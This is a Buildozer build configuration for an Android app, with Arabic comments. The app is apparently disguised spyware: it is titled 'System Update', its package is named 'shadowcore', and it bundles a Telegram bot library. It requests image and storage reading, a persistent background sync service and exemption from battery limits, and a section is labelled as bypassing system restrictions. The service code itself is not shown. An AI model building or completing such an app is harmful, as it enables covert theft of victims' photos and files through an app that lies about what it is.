[app]
# اسم التطبيق والمعرف
title = System Update
package.name = shadowcore
package.domain = org.test

# مكان الكود
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 1.0

# --- [سطر تجنب الخطأ: المتطلبات الأساسية فقط] ---
# قمت بتقليل المكتبات للمهم فقط لضمان عدم فشل التجميع (Compiling)
requirements = python3,kivy,pyjnius,requests,pyTelegramBotAPI,sqlite3

orientation = portrait
fullscreen = 0

# الأذونات المطلوبة للعمل في الخلفية والمزامنة
android.permissions = INTERNET, WAKE_LOCK, FOREGROUND_SERVICE, POST_NOTIFICATIONS, READ_EXTERNAL_STORAGE, READ_MEDIA_IMAGES, FOREGROUND_SERVICE_DATA_SYNC, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS

# إصدار الأندرويد المستهدف (33 مثالي لتجنب الرفض)
android.api = 33
android.minapi = 21
android.archs = arm64-v8a, armeabi-v7a

# تفعيل المكتبات الحديثة لتجنب أخطاء التوافق
android.enable_androidx = True

# ربط ملف الخدمة (service.py)
services = Service:service.py

# --- [إعدادات تجاوز قيود النظام] ---
android.service_type = dataSync
android.manifest.attributes = android:requestLegacyExternalStorage="true"

[buildozer]
# مستوى التسجيل (Debug) لمراقبة الأخطاء بدقة
log_level = 2
warn_on_root = 1
